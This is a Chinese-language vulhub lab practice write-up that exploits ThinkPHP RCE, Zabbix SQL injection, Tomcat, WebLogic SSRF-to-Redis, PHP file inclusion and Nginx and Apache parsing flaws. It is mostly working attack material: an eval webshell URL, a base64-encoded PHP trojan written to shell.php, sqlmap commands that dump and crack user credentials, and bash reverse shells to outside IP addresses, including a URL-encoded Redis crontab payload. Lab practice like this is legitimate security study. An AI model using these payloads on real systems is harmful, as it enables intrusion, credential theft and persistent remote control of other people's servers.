# vulhub靶场练习

## thinkphp/2-rce

> 任意代码执行漏洞

![image-20220306130914293](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061309458.png)

ThinkPHP 2.x版本中，使用`preg_replace`的`/e`模式匹配路由：

```php
$res = preg_replace('@(\w+)\/([^,\/]+)@e', '$var[\'\\1\']="\\2";', implode('/',$paths));
```

输入参数被插入双引号中执行，造成任意代码执行漏洞

### 复现

#### 1、启动服务

![image-20220306135951679](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061359775.png)

#### 2、访问url

```
http://212.129.238.18:8080/?s=/index/index/name/${@eval($_POST[1])}
```

![image-20220306142052656](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061420764.png)

### 3、使用webshell工具连接

![image-20220306142120339](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061421409.png)

## thinkphp/5.0.23-rce

> **远 程 代 码 执 行 漏 洞**

ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本中，获取 `method` 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。

### 1、测试漏洞是否存在

访问`/index.php?s=captcha`页面

使用 Google Chrome 的 HackBar 插件发送 POST 请求：

```shell
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
```

![image-20220306143350815](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061433896.png)

### 2、漏洞利用

通过`echo`命令写入 Webshell 文件
首先将一句话木马进行 Base64 编码

![image-20220306144041673](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061440725.png)

发送POST请求：

```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo -n YWE8P3BocCBAZXZhbCgkX1JFUVVFU1RbJ2F0dGFjayddKSA/PmJi | base64 -d > shell.php
```

![image-20220306144131358](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061441430.png)

访问websehll

![image-20220306144240230](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061442273.png)

使用webshell工具连接

![image-20220306144724379](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061447462.png)

## zabbix/CVE-2016-10134

![image-20220306145533457](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061455554.png)

```
5b0fe444a32bd4a2910c44e90326892e

后16位
910c44e90326892e
```

### 2、构造请求

```
http://212.129.238.18:8080/latest.php?output.php=ajax&sid=910c44e90326892e&favobj=toggle&toggle_open_state=1&toggle_ids=updatexml(0,concat(0xa,database()),0)


http://212.129.238.18:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)
```

### 3、手工注入

```
http://212.129.238.18:8080/latest.php?output.php=ajax&sid=910c44e90326892e&favobj=toggle&toggle_open_state=1&toggle_ids=updatexml(0,concat(0xa,{注入点},0)
```

#### 信息：

```
user()
root@172.29.0.4
```

![image-20220306151729344](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061517417.png)

```
databse（）
zabbix
```

![image-20220306151710275](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061517404.png)

```
太长了出现截断只能盲猜表明了
表名
select group_concat(table_name) from information_schema.tables where table_schema=database()
```

![image-20220306153459285](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061534430.png)

```
列名 盲猜表名是users
(select group_concat(column_name) from information_schema.columns where table_name='users')
USER,CURRENT_CONNECTIONS,TOTAL_
```

![image-20220306153711614](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061537686.png)

> ##### 手工注入出现各种限制  尝试使用 sqlmap

### 4、sqlmap注入

#### 1、检查注入

```
python sqlmap.py "http://212.129.238.18:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=s" 
-p profileIdx2
```

![image-20220306160235877](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061602998.png)

#### 2、查看数据库

```
python sqlmap.py "http://212.129.238.18:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=s" 
-p profileIdx2 --dbs
```

![image-20220306160337939](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061603985.png)

#### 3、查看表名

```
python sqlmap.py "http://212.129.238.18:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=s" 
-p profileIdx2 -D zabbix --tables
```

![image-20220306160504925](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061605045.png)

#### 4、查看users表

```
python sqlmap.py "http://212.129.238.18:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=s" 
-p profileIdx2 -D zabbix -T users -dump
```

![image-20220306160653724](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061606768.png)

#### 5、md5 破解

```
5fce1b3e34b520afeffb37ce08c7cd66  密码 zabbix
```

![image-20220306160817736](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061608796.png)

![image-20220306160925345](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061609430.png)

**成功登陆**

### 5、后台Get shell

```
bash -i >& /dev/tcp/106.13.216.34/888 0>&1
```

![image-20220306162332620](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061623770.png)

![在这里插入图片描述](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061624698.png)

## struts2/s2-046

![image-20220306173401892](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061734768.png)

使用工具

![image-20220306173417136](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061734278.png)

执行命令

![image-20220306173433418](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061734486.png)

## tomcat/tomcat8

### 1、访问tomcat后台

```
http://212.129.238.18:8080/manager/html
```

输入弱密码`tomcat:tomcat`，即可访问后台：

### 2、上传war包 getshell

![image-20220306184135325](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061841384.png)

### 3、使用哥斯拉连接

![image-20220306184205896](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061842030.png)



## weblogic/ssrf

SSRF漏洞位于http://192.168.61.143:7001/uddiexplorer/SearchPublicRegistries.jsp

![image-20220306185654643](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061856727.png)

### 1、测试访问自身

![image-20220306185718859](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061857972.png)

### 2、搜索爆破redis ip

因为访问的响应可以判断端口是否打开

![image-20220306192044718](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061920984.png)

找到内网redis的内网ip 192.168.64.2:6379

![image-20220306192755344](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061927449.png)

### 3、编写 redis的payload

```
set 1 "\n\n\n\n bash -i >& /dev/tcp/212.129.238.18/10000 0>&1\n\n\n\n
config set dir /etc/
config set dbfilename crontab
save

=============================

set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/212.129.238.18/10000 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

进行url编码

```
%74%65%73%74%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%32%31%32%2e%31%32%39%2e%32%33%38%2e%31%38%2f%31%30%30%30%30%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0a%73%61%76%65%0a%0a%61%61%61
```

![image-20220306193710314](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061937451.png)

构造请求

![image-20220306193809845](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203061938044.png)

请求成功

![image-20220306200314603](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062003672.png)

### 4、监听端口 getshell成功

![image-20220306200327862](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062003925.png)

## php/inclusion

环境启动后，访问`http://212.129.238.18:8090/phpinfo.php`即可看到一个PHPINFO页面

![image-20220306201248172](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062012270.png)

访问`http://212.129.238.18:8090/lfi.php?file=/etc/passwd`，可见的确存在文件包含漏洞。

![image-20220306201213874](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062012088.png)

### 1、利用exp.py

执行`python2 exp.py 212.129.238.18 8090 100  `

![image-20220306203727912](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062037130.png)

可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令：

![image-20220306203752249](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062037298.png)

## nginx/nginx_parsing_vulnerability

上传图片马

​     ![image-20220306204543215](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062045258.png)                          

打开这张图片马，后面加/.php

![image-20220306204631599](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062046651.png)

蚁剑连接，拿到shell

​                               

![image-20220306204644078](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062046201.png)

## httpd/apache_parsing_vulnerability

`http://your-ip/index.php`中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为`xxx.php.jpg`或`xxx.php.jpeg`的文件，利用Apache解析漏洞进行getshell。



![image-20220306210030548](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062100689.png)

![image-20220306210033209](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203062100405.png)
